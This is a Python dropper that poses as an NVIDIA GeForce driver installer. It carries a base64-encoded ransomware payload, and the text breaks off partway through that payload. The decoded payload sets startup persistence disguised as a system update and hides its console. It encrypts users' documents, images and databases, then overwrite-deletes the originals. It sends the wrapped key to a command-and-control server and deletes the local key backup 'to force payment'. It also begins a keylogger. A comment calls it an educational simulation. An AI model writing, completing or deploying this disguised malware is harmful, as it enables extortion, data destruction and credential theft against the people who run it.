import sys
import os
import base64
import subprocess
import threading
import time
import tempfile
import ctypes
from tkinter import Tk, Label, Button, ttk, PhotoImage, Frame

# --- CONFIGURATION ---
FAKE_TITLE = "NVIDIA GeForce Game Ready Driver Installer"
PAYLOAD_B64 = "IyByYW5zb213YXJlLnB5CmltcG9ydCBvcwppbXBvcnQgc3lzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGpzb24KaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgc29ja2V0CmltcG9ydCBzaHV0aWwKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IGN0eXBlcwoKIyBERUJVRzogQ3Jhc2ggTG9nZ2luZyBmb3IgSW1wb3J0cwp0cnk6CiAgICBmcm9tIHRraW50ZXIgaW1wb3J0IFRrLCBMYWJlbCwgRW50cnksIEJ1dHRvbiwgU3RyaW5nVmFyLCBGcmFtZSwgUGhvdG9JbWFnZSwgbWVzc2FnZWJveAogICAgZnJvbSB0a2ludGVyIGltcG9ydCBmb250IGFzIHRrZm9udAogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycyBpbXBvcnQgQ2lwaGVyLCBhbGdvcml0aG1zLCBtb2RlcwogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IGhhc2hlcwogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMua2RmLnBia2RmMiBpbXBvcnQgUEJLREYySE1BQwogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzIGltcG9ydCBkZWZhdWx0X2JhY2tlbmQKICAgIGltcG9ydCByZXF1ZXN0cwogICAgZnJvbSBweW5wdXQgaW1wb3J0IGtleWJvYXJkCmV4Y2VwdCBJbXBvcnRFcnJvciBhcyBlOgogICAgdHJ5OgogICAgICAgIGRlYnVnX3BhdGggPSBvcy5wYXRoLmpvaW4ob3MucGF0aC5leHBhbmR1c2VyKCJ+IiksICJSQU5TT01XQVJFX0lNUE9SVF9FUlJPUi50eHQiKQogICAgICAgIHdpdGggb3BlbihkZWJ1Z19wYXRoLCAidyIpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZiJGYWlsZWQgdG8gaW1wb3J0IG1vZHVsZXM6IHtlfSIpCiAgICBleGNlcHQ6IHBhc3MKICAgIHN5cy5leGl0KDEpCgojIC0tLSBDb25maWd1cmF0aW9uIC0tLQojIFBBU1RFIFRIRSBQVUJMSUMgS0VZIEZST00gVEhFIEMyIFNFUlZFUidTIENPTlNPTEUgT1VUUFVUIEhFUkUKQVRUQUNLRVJfUFVCTElDX0tFWSA9ICIiIi0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tCk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBeTI1YUVvQU11UVNaZi9OVWRDMVUKWk5ZVFhhTDBUODZSOTNWM01ORVlyK0liNUlidFdKZ2J4SWZ5MlJyckdsb2QwaCs1ZHh6NjlGZGZvVy9UQUZPMwpsblc2QXA4em5RREplOTdxbE01ZHJpY2wxNGtVYnFQd2M4c2s2QkFRb1Q5ZmFKU0ZhZ1JxU3NhR245WXZuenVXCm8wcTdvL0QraWxuR2M5WFdoSGdaRGwvdkVTR1pFWmVKRDFnZzM1MWlYcHBySjdBUmlmdUFWbyt4YWlnRXNtWU4KcEo1cWlKNXk5ZUVITEt3dUI2RmtwUi81Y3Q3VytHN1kxSGpFemtMbzhHK29RQjR6RmxyQUlOWlB2SG9RNHVKQQpFZnJVdkkvUHoyS2syUUN6RFhHWVpOY3NBYnlsMkVsbW1TcXBxejBzZjZkVks1Ty85bWw4bEZWbittK1E5SFQrCkR3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQoiIiIKCkMyX1NFUlZFUl9VUkwgPSAiaHR0cDovLzEwLjAuMC4yMTI6NTAwMCIgIyBDaGFuZ2UgaWYgeW91ciBDMiBpcyBob3N0ZWQgZWxzZXdoZXJlCgojIC0tLSBQQVRIIENPTkZJR1VSQVRJT04gLS0tCmRlZiBnZXRfcGF0aHMoKToKICAgICIiIkRldGVybWluZXMgc3RhYmxlIHBhdGhzIGZvciBjb25maWcgYW5kIHRhcmdldCBkYXRhLiIiIgogICAgaG9tZSA9IG9zLnBhdGguZXhwYW5kdXNlcigifiIpCiAgICAKICAgIGlmIG9zLm5hbWUgPT0gJ250JzoKICAgICAgICBjb25maWdfZGlyID0gb3MucGF0aC5qb2luKG9zLmVudmlyb24uZ2V0KCdBUFBEQVRBJywgaG9tZSksICJDZXJiZXJ1cyIpCiAgICBlbHNlOgogICAgICAgIGNvbmZpZ19kaXIgPSBvcy5wYXRoLmpvaW4oaG9tZSwgIi5jb25maWciLCAiY2VyYmVydXMiKQogICAgICAgIAogICAgIyBFTkNSWVBUIE9OTFkgJ3Rlc3RfZGF0YScgSU4gSE9NRSBESVJFQ1RPUlkKICAgIHRhcmdldF9kaXIgPSBvcy5wYXRoLmpvaW4oaG9tZSwgInRlc3RfZGF0YSIpCiAgICAKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhjb25maWdfZGlyKToKICAgICAgICB0cnk6IG9zLm1ha2VkaXJzKGNvbmZpZ19kaXIpCiAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgCiAgICByZXR1cm4gY29uZmlnX2RpciwgdGFyZ2V0X2RpcgoKQ09ORklHX0RJUiwgVEFSR0VUX0RJUkVDVE9SWSA9IGdldF9wYXRocygpCgojIFBlcnNpc3RlbmNlIEZpbGVzIChTdG9yZWQgaW4gSElEREVOIENvbmZpZyBEaXIpCkxPQ0tfRklMRSA9IG9zLnBhdGguam9pbihDT05GSUdfRElSLCAiLmNlcmJlcnVzX2xvY2siKQpJRF9GSUxFID0gb3MucGF0aC5qb2luKENPTkZJR19ESVIsICJjZXJiZXJ1c19pZC50eHQiKSAKS0VZX0JBQ0tVUF9GSUxFID0gb3MucGF0aC5qb2luKENPTkZJR19ESVIsICJjZXJiZXJ1c19rZXkuYmFrIikKTE9HX0ZJTEUgPSBvcy5wYXRoLmpvaW4oQ09ORklHX0RJUiwgImNlcmJlcnVzX2xvZy50eHQiKQoKIyBDbGVhbnVwIE1hcmtlciAoQ2FuIHN0YXkgaW4gY29uZmlnIGRpciBvciBiZSBnbG9iYWwpCkNMRUFOX01BUktFUiA9IG9zLnBhdGguam9pbihDT05GSUdfRElSLCAiLmNlcmJlcnVzX2ZyZWVkIikKCkVOQ1JZUFRFRF9FWFRFTlNJT04gPSAiLmNlcmJlcnVzIgoKIyAtLS0gRmlsZSBUeXBlIFRhcmdldGluZyAtLS0KVEFSR0VUX0VYVEVOU0lPTlMgPSB7CiAgICAnLnR4dCcsICcuZG9jJywgJy5kb2N4JywgJy54bHMnLCAnLnhsc3gnLCAnLnBwdCcsICcucHB0eCcsICcucGRmJywKICAgICcuanBnJywgJy5qcGVnJywgJy5wbmcnLCAnLmdpZicsICcuYm1wJywgJy50aWZmJywgJy5zdmcnLAogICAgJy5tcDMnLCAnLndhdicsICcubXA0JywgJy5hdmknLCAnLm1vdicsICcubWt2JywgJy5zcWwnLCAnLmRiJwp9CgojIC0tLSBHVUkgQXNzZXQgKEJhc2U2NCBlbmNvZGVkIDF4MSByZWQgcGl4ZWwgZm9yIGxvZ28pIC0tLQpMT0dPX0JBU0U2NCA9ICIiIgppVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBQUVBQUFBQkNBWUFBQUFmRmNTSkFBQUFEVWxFUVZSNDJtUDgvNStoSGdBSGdnSi9QY2hJN3dBQUFBQkpSVTVFcmtKZ2dnPT0KIiIiCgojIC0tLSBQZXJzaXN0ZW5jZSBVdGlsaXRpZXMgLS0tCmRlZiBpbnN0YWxsX3BlcnNpc3RlbmNlKCk6CiAgICAiIiJJbnN0YWxscyB0aGUgcmFuc29td2FyZSB0byBydW4gb24gc3RhcnR1cCB1c2luZyBhYnNvbHV0ZSBwYXRocy4iIiIKICAgIHRyeToKICAgICAgICBpZiBnZXRhdHRyKHN5cywgJ2Zyb3plbicsIEZhbHNlKToKICAgICAgICAgICAgYXBwX3BhdGggPSBzeXMuZXhlY3V0YWJsZQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGFwcF9wYXRoID0gb3MucGF0aC5hYnNwYXRoKF9fZmlsZV9fKQogICAgICAgICAgICAKICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6CiAgICAgICAgICAgIGltcG9ydCB3aW5yZWcKICAgICAgICAgICAga2V5X3BhdGggPSByIlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAga2V5ID0gd2lucmVnLk9wZW5LZXkod2lucmVnLkhLRVlfQ1VSUkVOVF9VU0VSLCBrZXlfcGF0aCwgMCwgd2lucmVnLktFWV9TRVRfVkFMVUUpCiAgICAgICAgICAgICAgICBjbWQgPSBmJyJ7YXBwX3BhdGh9IicKICAgICAgICAgICAgICAgIHdpbnJlZy5TZXRWYWx1ZUV4KGtleSwgIldpbmRvd3NTeXN0ZW1VcGRhdGUiLCAwLCB3aW5yZWcuUkVHX1NaLCBjbWQpCiAgICAgICAgICAgICAgICB3aW5yZWcuQ2xvc2VLZXkoa2V5KQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBsb2dfZXJyb3IoZiJXaW5kb3dzIHBlcnNpc3RlbmNlIGZhaWxlZDoge2V9IikKICAgICAgICBlbHNlOgogICAgICAgICAgICBhdXRvc3RhcnRfZGlyID0gb3MucGF0aC5leHBhbmR1c2VyKCJ+Ly5jb25maWcvYXV0b3N0YXJ0IikKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGF1dG9zdGFydF9kaXIpOgogICAgICAgICAgICAgICAgdHJ5OiBvcy5tYWtlZGlycyhhdXRvc3RhcnRfZGlyKQogICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgICAgIAogICAgICAgICAgICBkZXNrdG9wX2ZpbGUgPSBvcy5wYXRoLmpvaW4oYXV0b3N0YXJ0X2RpciwgInN5c3RlbV91cGRhdGUuZGVza3RvcCIpCiAgICAgICAgICAgIHdpdGggb3BlbihkZXNrdG9wX2ZpbGUsICJ3IikgYXMgZjoKICAgICAgICAgICAgICAgIGYud3JpdGUoZiJbRGVza3RvcCBFbnRyeV1cbiIpCiAgICAgICAgICAgICAgICBmLndyaXRlKGYiVHlwZT1BcHBsaWNhdGlvblxuIikKICAgICAgICAgICAgICAgIGYud3JpdGUoZiJOYW1lPVN5c3RlbSBDcml0aWNhbCBVcGRhdGVcbiIpCiAgICAgICAgICAgICAgICAjIENvbW1hbmQ6IHB5dGhvbjMgL3BhdGgvdG8vcmFuc29td2FyZS5weQogICAgICAgICAgICAgICAgaWYgZ2V0YXR0cihzeXMsICdmcm96ZW4nLCBGYWxzZSk6CiAgICAgICAgICAgICAgICAgICAgIGNtZCA9IGYie2FwcF9wYXRofSIKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgIGNtZCA9IGYie3N5cy5leGVjdXRhYmxlfSB7YXBwX3BhdGh9IgogICAgICAgICAgICAgICAgZi53cml0ZShmIkV4ZWM9e2NtZH1cbiIpCiAgICAgICAgICAgICAgICBmLndyaXRlKGYiVGVybWluYWw9ZmFsc2VcbiIpCiAgICAgICAgICAgICAgICBmLndyaXRlKGYiWC1HTk9NRS1BdXRvc3RhcnQtZW5hYmxlZD10cnVlXG4iKQogICAgICAgICAgICAKICAgICAgICAgICAgdHJ5OiBzdWJwcm9jZXNzLnJ1bihbJ2NobW9kJywgJyt4JywgZGVza3RvcF9maWxlXSkKICAgICAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgICAgIAogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZ19lcnJvcihmIlBlcnNpc3RlbmNlIGluc3RhbGxhdGlvbiBmYWlsZWQ6IHtlfSIpCgpkZWYgcmVtb3ZlX3BlcnNpc3RlbmNlKCk6CiAgICAiIiJSZW1vdmVzIHRoZSBwZXJzaXN0ZW5jZSBtZWNoYW5pc20uIiIiCiAgICB0cnk6CiAgICAgICAgaWYgb3MubmFtZSA9PSAnbnQnOgogICAgICAgICAgICBpbXBvcnQgd2lucmVnCiAgICAgICAgICAgIGtleV9wYXRoID0gciJTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGtleSA9IHdpbnJlZy5PcGVuS2V5KHdpbnJlZy5IS0VZX0NVUlJFTlRfVVNFUiwga2V5X3BhdGgsIDAsIHdpbnJlZy5LRVlfU0VUX1ZBTFVFKQogICAgICAgICAgICAgICAgd2lucmVnLkRlbGV0ZVZhbHVlKGtleSwgIldpbmRvd3NTeXN0ZW1VcGRhdGUiKQogICAgICAgICAgICAgICAgd2lucmVnLkNsb3NlS2V5KGtleSkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgcGFzcyAKICAgICAgICBlbHNlOgogICAgICAgICAgICBwYXRocyA9IFsKICAgICAgICAgICAgICAgIG9zLnBhdGguZXhwYW5kdXNlcigifi8uY29uZmlnL2F1dG9zdGFydC9zeXN0ZW1fdXBkYXRlLmRlc2t0b3AiKSwKICAgICAgICAgICAgICAgIG9zLnBhdGguZXhwYW5kdXNlcigifi8ubG9jYWwvc2hhcmUvYXBwbGljYXRpb25zL3N5c3RlbV91cGRhdGUuZGVza3RvcCIpCiAgICAgICAgICAgIF0KICAgICAgICAgICAgZm9yIHAgaW4gcGF0aHM6CiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhwKToKICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUocCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBsb2dfZXJyb3IoZiJQZXJzaXN0ZW5jZSByZW1vdmFsIGZhaWxlZDoge2V9IikKCiMgLS0tIFN5c3RlbSBMb2NrZG93biBVdGlsaXRpZXMgLS0tCmRlZiBoaWRlX2NvbnNvbGUoKToKICAgIGlmIG9zLm5hbWUgPT0gJ250JzoKICAgICAgICB0cnk6CiAgICAgICAgICAgIGltcG9ydCBjdHlwZXMKICAgICAgICAgICAga2VybmVsMzIgPSBjdHlwZXMuV2luRExMKCdrZXJuZWwzMicpCiAgICAgICAgICAgIHVzZXIzMiA9IGN0eXBlcy5XaW5ETEwoJ3VzZXIzMicpCiAgICAgICAgICAgIGhXbmQgPSBrZXJuZWwzMi5HZXRDb25zb2xlV2luZG93KCkKICAgICAgICAgICAgaWYgaFduZDoKICAgICAgICAgICAgICAgIHVzZXIzMi5TaG93V2luZG93KGhXbmQsIDApICMgU1dfSElERSA9IDAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHBhc3MKCiMgLS0tIENyeXB0b2dyYXBoeSAtLS0KZGVmIGdlbmVyYXRlX2Flc19rZXkoKToKICAgIHJldHVybiBvcy51cmFuZG9tKDMyKQoKZGVmIGVuY3J5cHRfZmlsZV9hZXNfZ2NtKGZpbGVfcGF0aCwga2V5KToKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncmInKSBhcyBmOgogICAgICAgICAgICBkYXRhID0gZi5yZWFkKCkKICAgICAgICBub25jZSA9IG9zLnVyYW5kb20oMTIpCiAgICAgICAgY2lwaGVyID0gQ2lwaGVyKGFsZ29yaXRobXMuQUVTKGtleSksIG1vZGVzLkdDTShub25jZSksIGJhY2tlbmQ9ZGVmYXVsdF9iYWNrZW5kKCkpCiAgICAgICAgZW5jcnlwdG9yID0gY2lwaGVyLmVuY3J5cHRvcigpCiAgICAgICAgZW5jcnlwdGVkX2RhdGEgPSBlbmNyeXB0b3IudXBkYXRlKGRhdGEpICsgZW5jcnlwdG9yLmZpbmFsaXplKCkKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoICsgRU5DUllQVEVEX0VYVEVOU0lPTiwgJ3diJykgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShub25jZSArIGVuY3J5cHRvci50YWcgKyBlbmNyeXB0ZWRfZGF0YSkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZ19lcnJvcihmIkZhaWxlZCB0byBlbmNyeXB0IHtmaWxlX3BhdGh9OiB7ZX0iKQogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIGRlY3J5cHRfZmlsZV9hZXNfZ2NtKGVuY3J5cHRlZF9wYXRoLCBrZXkpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihlbmNyeXB0ZWRfcGF0aCwgJ3JiJykgYXMgZjoKICAgICAgICAgICAgbm9uY2VfdGFnX2RhdGEgPSBmLnJlYWQoKQogICAgICAgIG5vbmNlLCB0YWcsIGVuY3J5cHRlZF9kYXRhID0gbm9uY2VfdGFnX2RhdGFbOjEyXSwgbm9uY2VfdGFnX2RhdGFbMTI6MjhdLCBub25jZV90YWdfZGF0YVsyODpdCiAgICAgICAgY2lwaGVyID0gQ2lwaGVyKGFsZ29yaXRobXMuQUVTKGtleSksIG1vZGVzLkdDTShub25jZSwgdGFnKSwgYmFja2VuZD1kZWZhdWx0X2JhY2tlbmQoKSkKICAgICAgICBkZWNyeXB0b3IgPSBjaXBoZXIuZGVjcnlwdG9yKCkKICAgICAgICBkZWNyeXB0ZWRfZGF0YSA9IGRlY3J5cHRvci51cGRhdGUoZW5jcnlwdGVkX2RhdGEpICsgZGVjcnlwdG9yLmZpbmFsaXplKCkKICAgICAgICBvcmlnaW5hbF9wYXRoID0gZW5jcnlwdGVkX3BhdGgucmVtb3Zlc3VmZml4KEVOQ1JZUFRFRF9FWFRFTlNJT04pCiAgICAgICAgd2l0aCBvcGVuKG9yaWdpbmFsX3BhdGgsICd3YicpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZGVjcnlwdGVkX2RhdGEpCiAgICAgICAgb3MucmVtb3ZlKGVuY3J5cHRlZF9wYXRoKQogICAgICAgIHJldHVybiBUcnVlCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYiRmFpbGVkIHRvIGRlY3J5cHQge2VuY3J5cHRlZF9wYXRofToge2V9IikKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBzZWN1cmVfZGVsZXRlX2ZpbGUoZmlsZV9wYXRoLCBwYXNzZXM9MSk6IAogICAgdHJ5OgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGZpbGVfcGF0aCk6CiAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICJiYSsiKSBhcyBmOgogICAgICAgICAgICAgICAgbGVuZ3RoID0gZi50ZWxsKCkKICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgInIrYiIpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKG9zLnVyYW5kb20obGVuZ3RoKSkKICAgICAgICAgICAgb3MucmVtb3ZlKGZpbGVfcGF0aCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBsb2dfZXJyb3IoZiJGYWlsZWQgdG8gc2VjdXJlbHkgZGVsZXRlIHtmaWxlX3BhdGh9OiB7ZX0iKQoKIyAtLS0gTG9nZ2luZyAtLS0KZGVmIGxvZ19lcnJvcihtZXNzYWdlKToKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oTE9HX0ZJTEUsICdhJykgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShmInt0aW1lLnN0cmZ0aW1lKCclWS0lbS0lZCAlSDolTTolUycpfSAtIEVSUk9SOiB7bWVzc2FnZX1cbiIpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcyAKCiMgLS0tIFJhbnNvbXdhcmUgTG9naWMgLS0tCmRlZiBlbmNyeXB0X2RpcmVjdG9yeSgpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKFRBUkdFVF9ESVJFQ1RPUlkpOgogICAgICAgIHRyeTogb3MubWFrZWRpcnMoVEFSR0VUX0RJUkVDVE9SWSkKICAgICAgICBleGNlcHQ6IHBhc3MKCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhLRVlfQkFDS1VQX0ZJTEUpOgogICAgICAgIGxvZ19lcnJvcigiRm91bmQga2V5IGJhY2t1cC4gUmVzdW1pbmcgZnJvbSBjcmFzaC4uLiIpCiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIG9wZW4oS0VZX0JBQ0tVUF9GSUxFLCAncmInKSBhcyBmOgogICAgICAgICAgICAgICAgcmV0dXJuIGYucmVhZCgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzIAoKICAgIGlmIG9zLnBhdGguZXhpc3RzKExPQ0tfRklMRSk6CiAgICAgICAgbG9nX2Vycm9yKCJFbmNyeXB0aW9uIHNlZW1pbmdseSBjb21wbGV0ZSAoTG9jayBmaWxlIGV4aXN0cykuIikKICAgICAgICByZXR1cm4gTm9uZQoKICAgIGFlc19rZXkgPSBnZW5lcmF0ZV9hZXNfa2V5KCkKICAgIAogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihLRVlfQkFDS1VQX0ZJTEUsICd3YicpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoYWVzX2tleSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBsb2dfZXJyb3IoZiJGYWlsZWQgdG8gd3JpdGUga2V5IGJhY2t1cDoge2V9IikKCiAgICBlbmNyeXB0ZWRfZmlsZXMgPSAwCiAgICAjIE9OTFkgV0FMSyBUQVJHRVRfRElSRUNUT1JZCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhUQVJHRVRfRElSRUNUT1JZKToKICAgICAgICBmb3Igcm9vdCwgXywgZmlsZXMgaW4gb3Mud2FsayhUQVJHRVRfRElSRUNUT1JZKToKICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguc3BsaXRleHQoZmlsZSlbMV0ubG93ZXIoKSBpbiBUQVJHRVRfRVhURU5TSU9OUyBhbmQgbm90IGZpbGVfcGF0aC5lbmRzd2l0aChFTkNSWVBURURfRVhURU5TSU9OKToKICAgICAgICAgICAgICAgICAgICBpZiBlbmNyeXB0X2ZpbGVfYWVzX2djbShmaWxlX3BhdGgsIGFlc19rZXkpOgogICAgICAgICAgICAgICAgICAgICAgICBzZWN1cmVfZGVsZXRlX2ZpbGUoZmlsZV9wYXRoKQogICAgICAgICAgICAgICAgICAgICAgICBlbmNyeXB0ZWRfZmlsZXMgKz0gMQoKICAgIHdpdGggb3BlbihMT0NLX0ZJTEUsICd3JykgYXMgZjoKICAgICAgICBmLndyaXRlKCJFbmNyeXB0aW9uIGNvbXBsZXRlLiIpCgogICAgbG9nX2Vycm9yKGYiRW5jcnlwdGlvbiBmaW5pc2hlZC4ge2VuY3J5cHRlZF9maWxlc30gZmlsZXMgdGFyZ2V0ZWQuIikKICAgIHJldHVybiBhZXNfa2V5CgpkZWYgY2hlY2tfaW5fd2l0aF9jMihhZXNfa2V5KToKICAgIHRyeToKICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgc2VyaWFsaXphdGlvbgogICAgICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmFzeW1tZXRyaWMgaW1wb3J0IHBhZGRpbmcKICAgICAgICAKICAgICAgICBwdWJsaWNfa2V5ID0gc2VyaWFsaXphdGlvbi5sb2FkX3BlbV9wdWJsaWNfa2V5KEFUVEFDS0VSX1BVQkxJQ19LRVkuZW5jb2RlKCksIGJhY2tlbmQ9ZGVmYXVsdF9iYWNrZW5kKCkpCiAgICAgICAgZW5jcnlwdGVkX2Flc19rZXkgPSBwdWJsaWNfa2V5LmVuY3J5cHQoCiAgICAgICAgICAgIGFlc19rZXksCiAgICAgICAgICAgIHBhZGRpbmcuT0FFUCgKICAgICAgICAgICAgICAgIG1nZj1wYWRkaW5nLk1HRjEoYWxnb3JpdGhtPWhhc2hlcy5TSEEyNTYoKSksCiAgICAgICAgICAgICAgICBhbGdvcml0aG09aGFzaGVzLlNIQTI1NigpLAogICAgICAgICAgICAgICAgbGFiZWw9Tm9uZQogICAgICAgICAgICApCiAgICAgICAgKQogICAgICAgIHBheWxvYWQgPSB7ImtleSI6IGJhc2U2NC5iNjRlbmNvZGUoZW5jcnlwdGVkX2Flc19rZXkpLmRlY29kZSgndXRmLTgnKX0KICAgICAgICAKICAgICAgICB2aWN0aW1faWQgPSBOb25lCiAgICAgICAgbG9nX2Vycm9yKGYiQXR0ZW1wdGluZyB0byBjb25uZWN0IHRvIEMyIGF0OiB7QzJfU0VSVkVSX1VSTH0iKQogICAgICAgIAogICAgICAgIGZvciBfIGluIHJhbmdlKDMpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoZiJ7QzJfU0VSVkVSX1VSTH0vYXBpL2NoZWNraW4iLCBqc29uPXBheWxvYWQsIHRpbWVvdXQ9NSkKICAgICAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICB2aWN0aW1faWQgPSByZXNwb25zZS5qc29uKCkuZ2V0KCd2aWN0aW1faWQnKQogICAgICAgICAgICAgICAgICAgIGxvZ19lcnJvcihmIkNvbm5lY3RlZCEgVmljdGltIElEOiB7dmljdGltX2lkfSIpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgbG9nX2Vycm9yKGYiQ29ubmVjdGlvbiBhdHRlbXB0IGZhaWxlZDoge2V9IikKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgICAKICAgICAgICBpZiBub3QgdmljdGltX2lkOgogICAgICAgICAgICAjIC0tLSBPRkZMSU5FIEZBTExCQUNLIC0tLQogICAgICAgICAgICBsb2dfZXJyb3IoIkMyIFVucmVhY2hhYmxlLiBTd2l0Y2hpbmcgdG8gT0ZGTElORSBNT0RFLiIpCiAgICAgICAgICAgICMgR2VuZXJhdGUgYSBsb2NhbCBJRCBzbyB0aGUgR1VJIHN0aWxsIGxhdW5jaGVzCiAgICAgICAgICAgIHZpY3RpbV9pZCA9ICJPRkZMSU5FLSIgKyBiYXNlNjQudXJsc2FmZV9iNjRlbmNvZGUob3MudXJhbmRvbSg0KSkuZGVjb2RlKCd1dGYtOCcpLnJzdHJpcCgnPScpCiAgICAgICAgICAgIAogICAgICAgICAgICAjIFNhdmUgdGhlIGtleSBsb2NhbGx5IGZvciBtYW51YWwgcmVjb3ZlcnkgaWYgbmVlZGVkIChpbiBhIHJlYWwgc2NlbmFyaW8gdGhpcyBtaWdodCBkaWZmZXIpCiAgICAgICAgICAgICMgRm9yIHRoaXMgZWR1Y2F0aW9uYWwvc2ltLCB3ZSBqdXN0IGtlZXAgdGhlIGtleSBiYWNrdXAgZmlsZSBhcyB0aGUgJ2tleSBzdG9yZScKICAgICAgICAgICAgIyBvciB3ZSBjb3VsZCB3cml0ZSBpdCB0byBhIHNlcGFyYXRlIGhpZGRlbiBmaWxlLgogICAgICAgICAgICBwYXNzCgogICAgICAgIHdpdGggb3BlbihJRF9GSUxFLCAndycpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUodmljdGltX2lkKQogICAgICAgIAogICAgICAgICMgSWYgd2UgYXJlIG9mZmxpbmUsIHdlIERPIE5PVCBkZWxldGUgdGhlIGtleSBiYWNrdXAsIHNvIHdlIGNhbiByZWNvdmVyIGl0IG1hbnVhbGx5IGlmIG5lZWRlZC4KICAgICAgICAjIElmIHdlIGFyZSBvbmxpbmUsIHdlIGRlbGV0ZSBpdCB0byBmb3JjZSBwYXltZW50LgogICAgICAgIGlmICJPRkZMSU5FIiBub3QgaW4gdmljdGltX2lkIGFuZCBvcy5wYXRoLmV4aXN0cyhLRVlfQkFDS1VQX0ZJTEUpOgogICAgICAgICAgICAgb3MucmVtb3ZlKEtFWV9CQUNLVVBfRklMRSkKICAgICAgICAgICAgCiAgICAgICAgbG9nX2Vycm9yKGYiQ2hlY2staW4gY29tcGxldGUuIEZpbmFsIFZpY3RpbSBJRDoge3ZpY3RpbV9pZH0iKQogICAgICAgIHJldHVybiB2aWN0aW1faWQKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYiQzIgY2hlY2staW4gY3JpdGljYWwgZmFpbHVyZToge2V9IikKICAgICAgICAjIFVsdGltYXRlIGZhbGxiYWNrCiAgICAgICAgcmV0dXJuICJDUklUSUNBTC1GQUlMVVJFIgoKIyAtLS0gS2V5bG9nZ2VyIExvZ2ljIC0tLQpjbGFzcyBLZXlsb2dnZXI6CiAgICBkZWYgX19pbml0X18oc2V